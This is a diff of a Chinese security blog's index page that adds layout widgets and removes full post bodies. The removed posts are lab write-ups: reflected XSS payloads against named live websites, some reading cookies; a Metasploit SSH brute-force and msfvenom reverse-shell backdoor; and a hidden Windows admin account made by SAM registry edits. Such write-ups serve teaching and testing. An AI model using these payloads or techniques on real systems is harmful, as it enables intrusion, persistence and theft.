@@ -180,6 +180,36 @@
     <ul id="menu" class="menu">
       
         
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
         <li class="menu-item menu-item-archives">
           <a href="/archives/" rel="section">
             
@@ -230,6 +260,15 @@
       <meta itemprop="image" content="/images/1.jpg">
     </span>
 
+     <span title="Words count in article">
+     168 字
+     </span>
+
+        ...
+     <span title="Reading time">
+     1 分钟
+     </span>
+
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="changyouB-log">
     </span>
@@ -275,6 +314,37 @@
           
 
           
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  168
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time </span>
+                
+                <span title="Reading time">
+                  1
+                </span>
+              
+            </div>
+          
 
           
 
@@ -292,57 +362,15 @@
 
       
         
-          
-            <h1 id="xss实战"><a href="#xss实战" class="headerlink" title="xss实战"></a>xss实战</h1><h4 id="百合网"><a href="#百合网" class="headerlink" title="百合网"></a>百合网</h4><p>首页： <a href="http://www.baihe.com/betatest/betatest_newlandpage.html?policy=1&amp;Channel=baidu&amp;Code=ppcbh00" target="_blank" rel="noopener">http://www.baihe.com/betatest/betatest_newlandpage.html?policy=1&amp;Channel=baidu&amp;Code=ppcbh00</a></p>
-<hr>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-http://sns.hunli.baihe.com/H5/notice/ajaxGetList?jsonCallBack=c%3Cscript%3Ealert(/xss/)%3C/script%3E
-
-
-
-http://sns.hunli.baihe.com/H5/notice/ajaxGetList?jsonCallBack=calert(/xss/)
-
-
-
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/1/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p><a href="http://u.baihe.com/index/getJYadvs?jsonCallBack=%3Cscript%3Ealert(/1/)%3C/script%3E**](http://u.baihe.com/index/getJYadvs?jsonCallBack=alert(/1/)]" target="_blank" rel="noopener">http://u.baihe.com/index/getJYadvs?jsonCallBack=%3Cscript%3Ealert(/1/)%3C/script%3E**](http://u.baihe.com/index/getJYadvs?jsonCallBack=alert(/1/)]</a>( <a href="http://localhost:4000" target="_blank" rel="noopener">http://localhost:4000</a> )</p>
- <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(%0ddocument%0a.%09cookie);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-http://u.baihe.com/index/getJYadvs?jsonCallBack=%3Cscript%3Ealert(%0ddocument%0a.%09cookie);%3C/script%3E
-
-
-
- http://sns.hunli.baihe.com/H5/notice/ajaxGetList?jsonCallBack=%3Cscript%3Ealert(%0ddocument%0a.%09cookie);%3C/script%3E
-
-
-
-HK携程
-
-https://hk.trip.com/travel-guide/search/?keyword=%3Cscript%3Ealert(%2Fxss%2F)%3C%2Fscript%3E
-
-
-
------------------------------------------------------------------------------------------------------------------------------------------------------------
-
-房天下
-
- <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://yz.esf.fang.com/map/" target="_blank" rel="noopener">https://yz.esf.fang.com/map/</a></p>
-<hr>
-<p>中国南方航空</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://b2c.csair.com/portal/minPrice/queryMinPriceInAirLines?jsoncallback=%3Cscript%3Ealert(/xss/)%3C/script%3E&amp;inter=Y" target="_blank" rel="noopener">https://b2c.csair.com/portal/minPrice/queryMinPriceInAirLines?jsoncallback=%3Cscript%3Ealert(/xss/)%3C/script%3E&amp;inter=Y</a></p>
-<hr>
-<p><a href="https://www.zhuego.com/index.php?m=search&amp;a=product&amp;key=%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E" target="_blank" rel="noopener">https://www.zhuego.com/index.php?m=search&amp;a=product&amp;key=%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E</a></p>
-<hr>
-<p><a href="http://www.ruigushop.com/Channel/index.html?search=PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=#sAnchor" target="_blank" rel="noopener">http://www.ruigushop.com/Channel/index.html?search=PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=#sAnchor</a></p>
-<hr>
-
-          
+          <p>记录发现的XSS漏洞</p>
+<h1 id="xss实战"><a href="#xss实战" class="headerlink" title="xss实战"></a>xss实战</h1>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/10/xss实战/" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -397,6 +425,15 @@ https://hk.trip.com/travel-guide/search/?keyword=%3Cscript%3Ealert(%2Fxss%2F)%3C
       <meta itemprop="image" content="/images/1.jpg">
     </span>
 
+     <span title="Words count in article">
+     1.9k 字
+     </span>
+
+        ...
+     <span title="Reading time">
+     7 分钟
+     </span>
+
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="changyouB-log">
     </span>
@@ -442,6 +479,37 @@ https://hk.trip.com/travel-guide/search/?keyword=%3Cscript%3Ealert(%2Fxss%2F)%3C
           
 
           
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  1.9k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time </span>
+                
+                <span title="Reading time">
+                  7
+                </span>
+              
+            </div>
+          
 
           
 
@@ -459,64 +527,14 @@ https://hk.trip.com/travel-guide/search/?keyword=%3Cscript%3Ealert(%2Fxss%2F)%3C
 
       
         
-          
-            <h1 id="MSF实验"><a href="#MSF实验" class="headerlink" title="MSF实验"></a>MSF实验</h1><h2 id="利用msf爆破ssh服务密码"><a href="#利用msf爆破ssh服务密码" class="headerlink" title="利用msf爆破ssh服务密码"></a>利用msf爆破ssh服务密码</h2><p>一、    实验目的</p>
-<ol>
-<li>了解SSH的概念</li>
-<li>理解MSF爆破SSH的工作原理</li>
-<li>掌握MSF爆破SSH服务密码的方法<br>二、    实验要求</li>
-<li>根据实验指导书，完成msf爆破ssh服务密码的实验操作。</li>
-<li>编制msf爆破ssh服务密码的实验报告，验证实验过程。<br>三、    实验原理<br>SSH是一种网络协议，用于计算机之间的加密登录。<br>如果一个用户从本地计算机，使用SSH协议登录另一台远程计算机，我们就可以认为，这种登录是安全的，即使被中途截获，密码也不会泄露。<br>最早的时候，互联网通信都是明文通信，一旦被截获，内容就暴露无疑。1995年，芬兰学者Tatu Ylonen设计了SSH协议，将登录信息全部加密，成为互联网安全的一个基本解决方案，迅速在全世界获得推广，目前已经成为Linux系统的标准配置。<br>需要指出的是，SSH只是一种协议，存在多种实现，既有商业实现，也有开源实现。本文针对的实现是OpenSSH，它是自由软件，应用非常广泛。<br>通过kali中的msf对我们具有ssh服务的服务器进行账号密码的爆破，从而让我们可以远程登录这台具有ssh服务的服务器</li>
-</ol>
-<p>四、    实验环境<br>Kali linux, centos<br>用户名：root<br>密码：sahoo@123<br>五、    实验操作<br>步骤一：    先打开msf</p>
-<p>步骤二：<br>作为我们的攻击机，我们利用msf这款工具来对ssh协议服务的账号密码进行爆破，输入msfconsole命令以开启msf这款工具</p>
-<p>步骤三：    然后我们用search ssh命令来查找相应的对ssh服务的一些攻击模块，其中划红箭头的是我们所需要的利用模块</p>
-<p>步骤四：    然后我们直接use这个模块，对这个模块的相关参数进行设置</p>
-<p>步骤五：    然后我们show options查看相应的参数设置，其中划红线的就是我们所需要设置的一些模块，RHOSTS是目标主机的ip，RPORT是目标主机开放ssh服务的相应端口，PASS_FILE是我们所需要的爆破密码的字典，USER_FILE使我们所需要的爆破用户名的字典，THREADS是我们爆破的线程，也可以理解为速度的快慢</p>
-<p>设置我们的目标主机的ip是192.168.78.129</p>
-<p>设置我们的目标主机开放ssh服务的端口 </p>
-<p>设置我们的线程为最大值5，这也是msf默认允许的最大的线程值</p>
-<p>步骤六：    字典的话我们可以自己用kali自带的crunch工具来生成，生成一个名为a.txt文件中，那么a.txt文件就是一个我们的字典，但是由于线程数非常的小，而且我们这次主要是以实验为主要目的，于是我们可以用网上一些较小的字典，来节省爆破的时间<br> 设置我们的密码的字典为桌面的pass.txt</p>
-<p>设置我们的用户名的字典为桌面的user.txt</p>
-<p>步骤七：    然后我们再次show options查看相应的设置是否完成</p>
-<p>步骤八：    设置完成后我们就直接exploit进行爆破，然后等待结果即可</p>
-<p>步骤九：    当爆破成功一个后，就会如此提示我们，并且提示我们已经成功的与目标主机建立了一个会话</p>
-<p>步骤十：    然后我们输入sessions 来查看这次会话的信息</p>
-<p>步骤十一：    然后我们用爆破出来的密码来进行ssh登录目标主机，可以看到我们进入了root用户的终端shell界面，当然我们也可以在我们刚才的msf中输入sessions -i 1来进入meterpreter界面从而输入shell来进入同样的终端界面，这两种方式都是可以的</p>
-<p>六、    实验结论<br>请按要求完成实验报告，并按时提交给老师。<br>实验效果验证</p>
-<p>七、    课后拓展<br>1.两种shell登录方式都试一下</p>
-<p>八、    先序课程</p>
-<ol>
-<li><p>《密码攻击-字典的生成》</p>
-<hr>
-<h2 id="metasploit之后门的生成"><a href="#metasploit之后门的生成" class="headerlink" title="metasploit之后门的生成"></a>metasploit之后门的生成</h2><p>后门简介<br>后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序方法。在软件的开发阶段，程序员常常会在软件内创建后门程序以便可以修改程序设计中的缺陷。但是，如果这些后门被其他人知道，或是在发布软件之前没有删除后门程序，那么它就成了安全风险，容易被黑客当成漏洞进行攻击。<br>metasploit可以生成多种多样的后门，比如windows、linux、java、php等。</p>
-<p>KALI ip 192.168.10.128<br>WIN7 ip 10.0.2.2 </p>
-<p>选择以下攻击载荷并生成一个exe的木马程序</p>
-<p>命令msfconsole 开启Metasploit</p>
-<p>查看payload，使用命令show payloads，msf提供了多种攻击载荷<br>选择以下攻击载荷（使用TAB键自动补全），并生成一个exe的木马程序<br>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.128 lport=4444 -f exe -o /123.exe<br>其中，lhost为kali linx的IP地址 生成的exe文件存放在根目录下</p>
-</li>
-</ol>
-<p>   使用命令 cd /，可以看到我们生成的exe文件</p>
-<hr>
-<p>   接下来，我们需要把生成的exe文件伪装成其他文件发送到目标机上。由于实验机环境限制，为了把我们生成的exe上传到目标机上，这里我们需要使用Putty这个工具，将生成的exe文件传到win7虚拟机上。</p>
-<hr>
-<p>   为了不出现连接被拒绝的情况，我们首先要在kali linux上打开ssh服务，并且关闭win7防火墙。<br>   在kali linux上打开ssh服务的方法：<br>   apt-get install openssh-server#安装<br>   一、配置SSH参数<br>   修改sshd_config文件，命令为：<br>   vi /etc/ssh/sshd_config<br>   将#PasswordAuthentication no的注释去掉，并且将NO修改为YES，kali中默认是yes<br>   右击桌面，单击打开终端，输入命令<br>   将PermitRootLogin without-password修改为<br>   PermitRootLogin yes<br>   二、启动SSH服务<br>   命令为：<br>   /etc/init.d/ssh start<br>   或者<br>   service ssh start<br>   查看SSH服务状态是否正常运行，命令为<br>   /etc/init.d/ssh status<br>   或者service ssh status<br>   那么需要生成两个密钥：<br>   ssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key<br>   ssh-keygen -t dsa -f /etc/ssh/ssh_host_rsa_key</p>
-<p>   执行命令后都会让输入密码，直接敲回车设置为空即可</p>
-<p>   Win7关闭防火墙的方法</p>
-<hr>
-<p>   接着打开win7上win+R输入psftp.exe，使用命令 open192.168.10.128  ，连接到kali linux，使用cd /跳转到根目录下，使用命令get 文件名把文件下载到本地。</p>
-<hr>
-<hr>
-<p>   在msf中设置监听<br>   use exploit/multi/handler </p>
-<p>   show options </p>
-<p>   设置我们后门生成时的攻击载荷<br>   set payload windows/meterpreter/reverse_tcp<br>   show options<br>   set payload windows/meterpreter/reverse_tcp</p>
-<p>   payload =&gt; windows/meterpreter/reverse_tcp</p>
-<p>   设置参数（与后门的参数相对应）<br>   msf exploit(multi/handler) &gt; set LHOST 192.168.10.128<br>   LHOST =&gt; 192.168.10.128<br>   msf exploit(multi/handler) &gt; set LPORT 4444<br>   LPORT =&gt; 4444</p>
-<p>   msf exploit(multi/handler) &gt; run</p>
-<p>   在windows主机上点击123.exe。当被攻击者运行了我们上传的后门程<br>   序时，会弹回一个shell<br>   [<em>] Started reverse TCP handler on 192.168.10.128:4444<br>   [</em>] Sending stage (179779 bytes) to 192.168.10.1<br>   [<em>] Sleeping before handling stage…<br>   [</em>] Meterpreter session 1 opened (192.168.10.128:4444 -&gt; 192.168.10.1:53292) at 2019-07-28 14:08:08 +0800</p>
-<p>   实验结束</p>
-
-          
+          <h1 id="MSF实验"><a href="#MSF实验" class="headerlink" title="MSF实验"></a>MSF实验</h1><h2 id="利用msf爆破ssh服务密码"><a href="#利用msf爆破ssh服务密码" class="headerlink" title="利用msf爆破ssh服务密码"></a>利用msf爆破ssh服务密码</h2>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/10/MSF实验/" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -571,6 +589,15 @@ https://hk.trip.com/travel-guide/search/?keyword=%3Cscript%3Ealert(%2Fxss%2F)%3C
       <meta itemprop="image" content="/images/1.jpg">
     </span>
 
+     <span title="Words count in article">
+     1.9k 字
+     </span>
+
+        ...
+     <span title="Reading time">
+     7 分钟
+     </span>
+
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="changyouB-log">
     </span>
@@ -616,6 +643,37 @@ https://hk.trip.com/travel-guide/search/?keyword=%3Cscript%3Ealert(%2Fxss%2F)%3C
           
 
           
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  1.9k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time </span>
+                
+                <span title="Reading time">
+                  7
+                </span>
+              
+            </div>
+          
 
           
 
@@ -633,35 +691,14 @@ https://hk.trip.com/travel-guide/search/?keyword=%3Cscript%3Ealert(%2Fxss%2F)%3C
 
       
         
-          
-            <h1 id="权限维持实验"><a href="#权限维持实验" class="headerlink" title="权限维持实验"></a>权限维持实验</h1><h2 id="利用注册表隐藏建立管理员账号"><a href="#利用注册表隐藏建立管理员账号" class="headerlink" title="利用注册表隐藏建立管理员账号"></a>利用注册表隐藏建立管理员账号</h2><p>实验环境<br>实验机环境：Windows 7<br>目标机环境：Windows 7<br>实验目的<br>了解注册表的权限设置<br>实验原理<br>在Windows里面有两个注册表工具，一个是regedit.exe，一个是regedt32.exe，Regedit.exe是我们熟知的注册表工具，而Regedt32.exe 不支持HYPERLINK “<a href="https://www.baidu.com/s?wd=%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%A1%B9&amp;tn=44039180_cpr&amp;fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1Y4m19buAu9PW9WujcLuymk0ZwV5Hcvrjm3rH6sPfKWUMw85HfYnjn4nH6sgvPsT6KdThsqpZwYTjCEQLGCpyw9Uz4Bmy-bIi4WUvYETgN-TLwGUv3EnHTdPWT4PHRLrHRdPHf3rjfY&quot;" target="_blank" rel="noopener">https://www.baidu.com/s?wd=%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%A1%B9&amp;tn=44039180_cpr&amp;fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1Y4m19buAu9PW9WujcLuymk0ZwV5Hcvrjm3rH6sPfKWUMw85HfYnjn4nH6sgvPsT6KdThsqpZwYTjCEQLGCpyw9Uz4Bmy-bIi4WUvYETgN-TLwGUv3EnHTdPWT4PHRLrHRdPHf3rjfY&quot;</a> \t “_blank”注册表项文件 (.reg) 的导入和导出。Regedit.exe 是 16 位 Windows 操作系统的注册编辑器，它用于修改 Windows 的注册数据库，是16位应用程序。Regedt32.exe 是 Windows NT的配置编辑器。它用于修改 Windows NT 配置数据库或 Windows NT 注册表。此编辑器允许您查看或修改 Windows NT 注册表。它提供了表示注册表各个部分（叫做配置单元）的窗口视图。每个窗口显示两部分：左侧是表示HYPERLINK “<a href="https://www.baidu.com/s?wd=%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%A1%B9&amp;tn=44039180_cpr&amp;fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1Y4m19buAu9PW9WujcLuymk0ZwV5Hcvrjm3rH6sPfKWUMw85HfYnjn4nH6sgvPsT6KdThsqpZwYTjCEQLGCpyw9Uz4Bmy-bIi4WUvYETgN-TLwGUv3EnHTdPWT4PHRLrHRdPHf3rjfY&quot;" target="_blank" rel="noopener">https://www.baidu.com/s?wd=%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%A1%B9&amp;tn=44039180_cpr&amp;fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1Y4m19buAu9PW9WujcLuymk0ZwV5Hcvrjm3rH6sPfKWUMw85HfYnjn4nH6sgvPsT6KdThsqpZwYTjCEQLGCpyw9Uz4Bmy-bIi4WUvYETgN-TLwGUv3EnHTdPWT4PHRLrHRdPHf3rjfY&quot;</a> \t “_blank”注册表项的文件夹。右侧是与所选HYPERLINK “<a href="https://www.baidu.com/s?wd=%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%A1%B9&amp;tn=44039180_cpr&amp;fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1Y4m19buAu9PW9WujcLuymk0ZwV5Hcvrjm3rH6sPfKWUMw85HfYnjn4nH6sgvPsT6KdThsqpZwYTjCEQLGCpyw9Uz4Bmy-bIi4WUvYETgN-TLwGUv3EnHTdPWT4PHRLrHRdPHf3rjfY&quot;" target="_blank" rel="noopener">https://www.baidu.com/s?wd=%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%A1%B9&amp;tn=44039180_cpr&amp;fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1Y4m19buAu9PW9WujcLuymk0ZwV5Hcvrjm3rH6sPfKWUMw85HfYnjn4nH6sgvPsT6KdThsqpZwYTjCEQLGCpyw9Uz4Bmy-bIi4WUvYETgN-TLwGUv3EnHTdPWT4PHRLrHRdPHf3rjfY&quot;</a> \t “_blank”注册表项关联的值。Regedt32 是一个功能强大的工具。使用它修改注册表值时必须格外小心。注册表中的值丢失或不正确将导致安装的 Windows NT 无法使用。<br>实验步骤<br>本实验中实验机为黑客机，目标机为被黑掉的主机，且实验前提为：实验机已经获得目标机的Administrator用户账号及口令，可以远程控制目标机。</p>
-<p>在实验机中，通过前几节介绍的知识，以远程桌面方式登陆到目标机上。在本次实验中，以下操作要以Administrator身份进行（ylitech账户即管理员账户）。<br>可跳过上面一步，直接在目标机中进行以下操作。<br>2.点击开始，输入框中输入cmd，右键以管理员身份运行命令提示符窗口，输入命令net user hacker$ 123456 /add（注意/add前有空格），添加hacker$用户账号，密码为123456。</p>
-<p>如果是第一次运行，会提示命令成功完成。</p>
-<p>3、继续在cmd中运行regedt32命令，打开注册表编辑器，在HKEY_LOCAL_MACHINE\SAM\SAM下右击—&gt;权限，点击Administrator，并将其权限设置为完全控制，点击应用-确定，再关闭注册表窗口。</p>
-<p>4、点击开始，输入regedit命令回车，打开注册表编辑器，依次展开HKEY_LOCAL_MECHINE\SAM\SAM\Domains\Account\Users，可以看到Names下的Administrator账号对应的权限为000001F4，hacker$账号对应的权限为000003E9。</p>
-<p>5、将hacker$、000001F4、000003E9这三项导出并分别命名为hacker$.reg，000001F4.reg，000003E9.reg。</p>
-<p>6、用记事本对导出的注册表文件进行编辑，将000001F4.reg下的F键值进行复制，覆盖000003E9.reg中的F键的键值。</p>
-<p>7、在cmd中输入命令type 源文件&gt;&gt;目标文件，将hacker$.reg与000003E9.reg合并至hacker$final.reg。</p>
-<p>8、继续在命令提示符窗口（管理员）中，运行net user hacker$ /del，删除hacker$，注册表中hacker$已删除。</p>
-<p>9、双击hacker$final.reg，用注册表编辑器打开，在注册表中可以看到又重新建立了hacker$账号。</p>
-<p>10、在cmd中运行regedt32，在SAM\SAM下右击—&gt;权限—&gt;去掉Administrator的权限（权限还原为默认设置）并关闭。</p>
-<p>11、在另外一台机器上使用远程桌面，并以账号hacker$，密码123456登陆。目标机的IP地址可在cmd中使用命令ipconfig查看。</p>
-<p>12、目标机的DoS命令行及计算机管理中都无法发现hacker$账号的痕迹。成功隐藏建立了后门账号。</p>
-<hr>
-<h2 id="在Windows中克隆管理员账号"><a href="#在Windows中克隆管理员账号" class="headerlink" title="在Windows中克隆管理员账号"></a>在Windows中克隆管理员账号</h2><p>实验环境<br>实验机环境：Windows 7<br>目标机环境：Windows 7<br>实验目的<br>了解并掌握如何对账号进行克隆<br>实验原理<br>后门，是绕过安全性控制而获取对程序或系统访问权的方法。<br>windows NT及HYPERLINK “<a href="https://www.baidu.com/s?wd=win2000&amp;tn=44039180_cpr&amp;fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1YzuANWmvwbmHfLry79mHK90ZwV5Hcvrjm3rH6sPfKWUMw85HfYnjn4nH6sgvPsT6KdThsqpZwYTjCEQLGCpyw9Uz4Bmy-bIi4WUvYETgN-TLwGUv3En1cvPjm1n1mvrjcLPHfvPHcd&quot;" target="_blank" rel="noopener">https://www.baidu.com/s?wd=win2000&amp;tn=44039180_cpr&amp;fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1YzuANWmvwbmHfLry79mHK90ZwV5Hcvrjm3rH6sPfKWUMw85HfYnjn4nH6sgvPsT6KdThsqpZwYTjCEQLGCpyw9Uz4Bmy-bIi4WUvYETgN-TLwGUv3En1cvPjm1n1mvrjcLPHfvPHcd&quot;</a> \t “_blank”win2000中对用户帐户的安全管理使用了安全帐号管理器(security account manager，SAM)的机制,安全帐号管理器对帐号的管理是通过HYPERLINK “<a href="https://www.baidu.com/s?wd=%E5%AE%89%E5%85%A8%E6%A0%87%E8%AF%86&amp;tn=44039180_cpr&amp;fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1YzuANWmvwbmHfLry79mHK90ZwV5Hcvrjm3rH6sPfKWUMw85HfYnjn4nH6sgvPsT6KdThsqpZwYTjCEQLGCpyw9Uz4Bmy-bIi4WUvYETgN-TLwGUv3En1cvPjm1n1mvrjcLPHfvPHcd&quot;" target="_blank" rel="noopener">https://www.baidu.com/s?wd=%E5%AE%89%E5%85%A8%E6%A0%87%E8%AF%86&amp;tn=44039180_cpr&amp;fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1YzuANWmvwbmHfLry79mHK90ZwV5Hcvrjm3rH6sPfKWUMw85HfYnjn4nH6sgvPsT6KdThsqpZwYTjCEQLGCpyw9Uz4Bmy-bIi4WUvYETgN-TLwGUv3En1cvPjm1n1mvrjcLPHfvPHcd&quot;</a> \t “_blank”安全标识进行的，HYPERLINK “<a href="https://www.baidu.com/s?wd=%E5%AE%89%E5%85%A8%E6%A0%87%E8%AF%86&amp;tn=44039180_cpr&amp;fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1YzuANWmvwbmHfLry79mHK90ZwV5Hcvrjm3rH6sPfKWUMw85HfYnjn4nH6sgvPsT6KdThsqpZwYTjCEQLGCpyw9Uz4Bmy-bIi4WUvYETgN-TLwGUv3En1cvPjm1n1mvrjcLPHfvPHcd&quot;" target="_blank" rel="noopener">https://www.baidu.com/s?wd=%E5%AE%89%E5%85%A8%E6%A0%87%E8%AF%86&amp;tn=44039180_cpr&amp;fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1YzuANWmvwbmHfLry79mHK90ZwV5Hcvrjm3rH6sPfKWUMw85HfYnjn4nH6sgvPsT6KdThsqpZwYTjCEQLGCpyw9Uz4Bmy-bIi4WUvYETgN-TLwGUv3En1cvPjm1n1mvrjcLPHfvPHcd&quot;</a> \t “_blank”安全标识在帐号创建时就同时创建，一旦帐号被删除，HYPERLINK “<a href="https://www.baidu.com/s?wd=%E5%AE%89%E5%85%A8%E6%A0%87%E8%AF%86&amp;tn=44039180_cpr&amp;fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1YzuANWmvwbmHfLry79mHK90ZwV5Hcvrjm3rH6sPfKWUMw85HfYnjn4nH6sgvPsT6KdThsqpZwYTjCEQLGCpyw9Uz4Bmy-bIi4WUvYETgN-TLwGUv3En1cvPjm1n1mvrjcLPHfvPHcd&quot;" target="_blank" rel="noopener">https://www.baidu.com/s?wd=%E5%AE%89%E5%85%A8%E6%A0%87%E8%AF%86&amp;tn=44039180_cpr&amp;fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1YzuANWmvwbmHfLry79mHK90ZwV5Hcvrjm3rH6sPfKWUMw85HfYnjn4nH6sgvPsT6KdThsqpZwYTjCEQLGCpyw9Uz4Bmy-bIi4WUvYETgN-TLwGUv3En1cvPjm1n1mvrjcLPHfvPHcd&quot;</a> \t “_blank”安全标识也同时被删除。安全标识是唯一的，即使是相同的用户名，在每次创建时获得的安全标识都时完全不同的。因此，一旦某个帐号被删除，它的安全标识就不再存在了，即使用相同的用户名重建帐号，也会被赋予不同的安全标识，不会保留原来的权限。<br>克隆（隐形提权）管理员账户是指：在计算机上使一个不属于管理员组的账号具有与管理员一样的权限。本例中将普通用户账号（ylitech）利用注册表克隆成具有管理员权限的账号。<br>实验步骤<br>1、在实验环境中的两台机器中任意选择一台，点击开始-计算机-管理。再点击本地用户和组-组，查看用户。只有Administrator的权限未被禁用（提示：的小箭头标志该用户被禁用）。</p>
-<p>2、右击普通用户ylitech-设置密码。（注：ylitech为本实验中目标机的普通用户，根据不同实验不同机器用户不同，该用户可以为任一不具有管理员权限的用户。）</p>
-<p>3、点击开始，在输入框中输入regedit，打开注册表编辑器。由于权限的问题，SAM下不会看到任何子键。</p>
-<p>4、右击第二个SAM权限，添加ylitech用户，并设置其权限为完全控制，应用，确定。</p>
-<p>5、刷新注册表，可以看到SAM下出现了管理员身份才能看到的内容。</p>
-<p>Administrator对应的项为“000001F4”。</p>
-<p>打开“000001F4”其下面的“F”，并将其内容复制。</p>
-<p>ylitech的对应项为“000003E8”，打开其下面的“F”，并将复制的Administrator的内容粘贴到这里，确定。完成将普通用户克隆成具有管理员权限的账户。</p>
-<p>此时点击第二个SAM，取消Administrator的完全控制和读取权限（将对勾选项取消）。</p>
-<p>刷新视图，发现和开始时无异样。</p>
-<p>6.回到计算机管理中，查看用户列表，发现ylitech仍是禁用状态，但是打开ylitech的属性发现该账户已经解除账户禁用状态。这样可以迷惑管理员。</p>
-<p>7.点击开始-注销，重新登陆ylitech账户，此时的ylitech账户实际上就是有管理员权限的账户。<br>五【实验小结】<br>Windows操作系统中的任何配置在注册表中均能实现，本实验恰恰验证了这一点。在注册表中进行克隆的普通用户账号在计算机管理中无法查看出它属于管理员组的成员，但是它的确已经具有了管理员的权限。</p>
-
-          
+          <h1 id="权限维持实验"><a href="#权限维持实验" class="headerlink" title="权限维持实验"></a>权限维持实验</h1><h2 id="利用注册表隐藏建立管理员账号"><a href="#利用注册表隐藏建立管理员账号" class="headerlink" title="利用注册表隐藏建立管理员账号"></a>利用注册表隐藏建立管理员账号</h2><p>实验环境<br>实验机环境：Windows 7<br>目标机环境：Windows 7<br>实验目的<br>了解注册表的权限设置<br>实验原理</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/10/权限维持实验/" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -716,6 +753,15 @@ https://hk.trip.com/travel-guide/search/?keyword=%3Cscript%3Ealert(%2Fxss%2F)%3C
       <meta itemprop="image" content="/images/1.jpg">
     </span>
 
+     <span title="Words count in article">
+     9.5k 字
+     </span>
+
+        ...
+     <span title="Reading time">
+     34 分钟
+     </span>
+
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
